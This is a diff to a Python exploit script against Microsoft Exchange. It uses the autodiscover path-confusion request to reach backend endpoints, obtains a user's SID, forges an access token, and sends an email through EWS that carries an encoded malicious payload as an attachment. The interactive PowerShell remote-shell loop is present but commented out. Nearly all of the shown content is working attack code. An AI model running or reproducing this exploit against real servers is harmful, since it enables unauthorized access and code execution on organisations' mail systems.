@@ -3,6 +3,8 @@ import argparse
 import sys
 import struct
 import base64
+import string
+import random
 import re
 import threading
 import xml.etree.ElementTree as ET
@@ -10,7 +12,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
 from pypsrp.powershell import PowerShell, RunspacePool
 from pypsrp.wsman import WSMan
-from encode_payload import encode_payload
+from encode_payload import generate_payload
 
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
@@ -108,7 +110,7 @@ def get_sid(url: str, email: str):
 
     print("[-] Getting LegacyDN")
     body = f"""
-<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{email}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>
+        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{email}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>
     """
 
     autodiscover_url = url + f"/autodiscover/autodiscover.json?@test.com/autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@test.com"
@@ -137,8 +139,13 @@ def get_sid(url: str, email: str):
     print("[+] Successfully get User SID")
     return sid
 
+def rand_subject(n=6):
+    return ''.join(random.choices(string.ascii_lowercase, k=n))
 
 def send_email_contains_malicious_payload():
+    encoded_payload = generate_payload()
+    subject_id = rand_subject(16)
+    print (f"[-] Sending email contains payload with subject id: {subject_id}")
     email_body = f"""
     <soap:Envelope
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -160,14 +167,14 @@ def send_email_contains_malicious_payload():
     <m:CreateItem MessageDisposition="SaveOnly">
       <m:Items>
         <t:Message>
-          <t:Subject>Microsoft Exchange Server</t:Subject>
-          <t:Body BodyType="HTML">hello, if you see this, you are hacked</t:Body>
+          <t:Subject>{subject_id}</t:Subject>
+          <t:Body BodyType="HTML">hello from darkness side</t:Body>
           <t:Attachments>
             <t:FileAttachment>
               <t:Name>FileAttachment.txt</t:Name>
               <t:IsInline>false</t:IsInline>
               <t:IsContactPhoto>false</t:IsContactPhoto>
-              <t:Content>{payload}</t:Content>
+              <t:Content>{encoded_payload}</t:Content>
             </t:FileAttachment>
           </t:Attachments>
           <t:ToRecipients>
@@ -182,10 +189,15 @@ def send_email_contains_malicious_payload():
 </soap:Envelope>
     """
     headers = {
-        "Content-Type": "text/xml"
+        "Content-Type": "text/xml",
+        # 'Cookie': f'Email=autodiscover/autodiscover.json?a=a@gmail.com'
     }
-    ews_endpoint = exchange_url + f"/autodiscover/autodiscover.json?@test.com/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@test.com"
-    resp = requests.post(ews_endpoint, data=email_body.encode('utf-8'), headers=headers, verify=False)
+    ews_endpoint = exchange_url + f"/autodiscover/autodiscover.json?@test.com/EWS/exchange.asmx?X-Rps-CAT={token}&Email=autodiscover/autodiscover.json%3F@test.com"
+    resp = requests.post(ews_endpoint, data=email_body, headers=headers, verify=False)
+    if resp.status_code == 200:
+        print (f"[+] Sent email successfully with subject id: {subject_id}")
+    return subject_id
+
 # ------------------------------------------------------------------------------
 
 
@@ -234,10 +246,11 @@ def main():
     sid = get_sid(exchange_url, email)
     token = gen_token(email, sid)
     check_token_valid(exchange_url, token)
-    start_server(port=local_port, url=exchange_url, token="token")
+    send_email_contains_malicious_payload()
+    # start_server(port=local_port, url=exchange_url, token=token)
 
-    while True:
-        shell(input('PS> '), local_port)
+    # while True:
+    #     shell(input('PS> '), local_port)
 
 
 if __name__ == '__main__':
